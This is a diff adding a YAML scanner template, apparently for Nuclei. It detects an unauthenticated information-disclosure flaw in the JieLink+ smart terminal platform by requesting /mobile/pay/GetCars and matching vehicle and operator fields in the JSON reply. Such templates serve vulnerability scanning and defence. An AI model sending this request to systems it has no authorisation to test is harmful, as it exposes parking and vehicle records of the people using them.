@@ -1,0 +1,25 @@
+id: poc-yaml-jielink-plus-getcars-info-leak
+info:
+  name: JieLink+智能终端操作平台 GetCars 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-disclosure
+http:
+  - method: GET
+    path:
+      - "/mobile/pay/GetCars?pageIndex=1&pageSize=20"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"EGUID\""
+          - "\"OperatorName\""
+          - "\"EnterPicture\""
+      - type: word
+        part: header
+        words:
+          - "application/json"
